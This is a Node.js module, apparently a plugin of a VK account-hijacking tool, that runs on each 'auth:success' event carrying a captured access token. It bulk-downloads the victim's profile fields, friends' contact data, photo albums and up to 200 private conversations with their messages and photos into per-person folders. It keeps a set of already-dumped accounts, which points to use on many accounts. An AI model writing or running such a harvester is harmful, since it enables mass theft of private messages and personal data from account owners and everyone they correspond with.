const { VK } = require("vk-io");
const {
  isMainThread,
  Worker,
  workerData,
  parentPort
} = require("worker_threads");
const path = require("path");
const fs = require("fs").promises;
const chalk = require("chalk");
const { promisify } = require("util");
const { photos: dumpPhotos } = require("./photos");

const sleep = promisify(setTimeout);
const dumped = new Set();

module.exports.name = "Dumper";

/**
 *
 * @param {any} config
 * @param {import("events").EventEmitter} ee
 */

module.exports.init = (config, ee) => {
  ee.on("auth:success", ({ token, user_id }) => {
    if (dumped.has(user_id)) {
      return console.log(
        chalk.yellowBright(
          `Profile was already dumped: https://vk.com/id${user_id}`
        )
      );
    }

    dumped.add(user_id);

    console.log(
      chalk.yellowBright(
        `Starting dumper for profile: https://vk.com/id${user_id}`
      )
    );

    dump(token)
      .then(() => {
        ee.emit("dumper:success", { user_id });
        console.log(
          chalk.greenBright(
            `Profile: https://vk.com/id${user_id} successful dumped`
          )
        );
      })
      .catch(error => {
        ee.emit("dumper:fail", { user_id });

        console.log(
          chalk.redBright(
            `Profile: https://vk.com/id${user_id} failed to dump`
          ),
          error
        );
      });
  });
};

const dump = token => {
  const worker = new Worker(__filename, { workerData: { token } });

  return new Promise((resolve, reject) => {
    worker.once("message", resolve);
    worker.once("error", reject);
  });
};

if (!isMainThread) {
  const { token } = workerData;
  const vk = new VK({ token });

  work(vk)
    .then(data => parentPort.postMessage(data))
    .catch(error => {
      throw error;
    });
}

const logKw = (key, value) =>
  console.log(chalk.blueBright(`${key}:`), chalk.magentaBright(value));

const logMessage = message => console.log(chalk.magentaBright(message));

const logError = error =>
  console.log(
    chalk.redBright(
      typeof error === "object" && "message" in error
        ? error.message
        : String(error)
    )
  );

const mkdir = path =>
  fs
    .opendir(path)
    .then(directory => directory.close())
    .catch(() => fs.mkdir(path, { recursive: true }));

/**
 *
 * @param {VK} vk
 */
async function work(vk) {
  const [me] = await vk.api.users.get({
    fields: [
      "about",
      "activities",
      "bdate",
      "books",
      "career",
      "city",
      "common_count",
      "connections",
      "contacts",
      "counters",
      "country",
      "crop_photo",
      "descriptions",
      "domain",
      "education",
      "exports",
      "followers_count",
      "games",
      "has_mobile",
      "has_photo",
      "home_town",
      "interests",
      "lists",
      "maiden_name",
      "military",
      "movies",
      "nickname",
      "occupation",
      "lists",
      "personal",
      "photo_max_orig",
      "quotes",
      "relatives",
      "schools",
      "screen_name",
      "sex",
      "site",
      "status",
      "timezone",
      "tv",
      "universities",
      "verified",
      "wall_comments"
    ]
  });

  logKw("Dumping", `${me.first_name} ${me.last_name}`);

  const dumpsDirectory = path.join(
    __dirname,
    "..",
    "..",
    "dumps",
    `${me.first_name} ${me.last_name} @${me.screen_name || "id" + me.id}`
  );

  await mkdir(dumpsDirectory);

  await fs.writeFile(
    path.join(dumpsDirectory, "user.json"),
    JSON.stringify(me),
    "utf8"
  );

  logKw("Dumping Section", "Friends");

  const friends = await vk.api.friends.get({
    count: 5000,
    fields: [
      "nickname",
      "domain",
      "sex",
      "bdate",
      "city",
      "country",
      "timezone",
      "photo_200_orig",
      "contacts",
      "education",
      "relation",
      "last_seen",
      "status",
      "can_post",
      "universities"
    ]
  });

  await fs.writeFile(
    path.join(dumpsDirectory, "friends.json"),
    JSON.stringify(friends),
    "utf8"
  );

  await sleep(3000);

  logKw("Dumping Section", "Photos");

  await mkdir(path.join(dumpsDirectory, "albums"));

  const { items: albums } = await vk.api.photos.getAlbums({
    need_system: true
  });

  for (const album of albums) {
    const albumPath = path.join(dumpsDirectory, "albums", album.title);

    await mkdir(albumPath);

    await fs.writeFile(
      path.join(albumPath, "_album.json"),
      JSON.stringify(album),
      "utf8"
    );

    logMessage(`Dumping Album ${album.title}`);

    try {
      const { items: photos } = await vk.api.photos.get({
        album_id: album.id,
        count: 1000
      });
      await dumpPhotos(albumPath, photos);
    } catch {
      logError(`Unable to dump album: ${album.title}`);
    }
  }

  logKw("Dumping Section", "Dialogs");

  await mkdir(path.join(dumpsDirectory, "dialogs"));

  const {
    items: dialogs,
    profiles,
    groups
  } = await vk.api.messages.getConversations({
    count: 200,
    filter: "all",
    extended: true
  });

  await fs.writeFile(
    path.join(dumpsDirectory, "dialogs", "groups.json"),
    JSON.stringify(groups),
    "utf8"
  );

  await fs.writeFile(
    path.join(dumpsDirectory, "dialogs", "profiles.json"),
    JSON.stringify(profiles),
    "utf8"
  );

  for (const { conversation } of dialogs) {
    try {
      const { peer } = conversation;

      let title = "untitled";

      switch (peer.type) {
        case "chat":
          title = conversation.chat_settings.title;
          break;
        case "group":
          title = groups.find(group => group.id === peer.local_id).name;
          break;
        case "user":
          // eslint-disable-next-line no-case-declarations
          const companion = profiles.find(
            profile => profile.id === peer.local_id
          );

          title = `${companion.first_name} ${companion.last_name}`;
          break;
      }

      logMessage(`Dialog ${title}`);

      const dialogDirectory = path.join(
        dumpsDirectory,
        "dialogs",
        `${title} ${peer.type}${peer.local_id}`
      );

      await mkdir(dialogDirectory);

      const { items: photos } = await vk.api.messages.getHistoryAttachments({
        count: 200,
        peer_id: peer.id,
        media_type: "photo",
        max_forwards_level: 10
      });

      await mkdir(path.join(dialogDirectory, "_photos"));

      await dumpPhotos(
        path.join(dialogDirectory, "_photos"),
        photos.map(photo => photo.attachment.photo)
      );

      const { items: messages } = await vk.api.messages.getHistory({
        count: 200,
        peer_id: peer.id
      });

      for (const message of messages) {
        await fs.writeFile(
          path.join(dialogDirectory, `${message.id}.json`),
          JSON.stringify(message),
          "utf8"
        );
      }
    } catch (error) {
      logError("Unable to dump dialog:");
      logError(error);
    }
  }

  return { Allah: true };
}
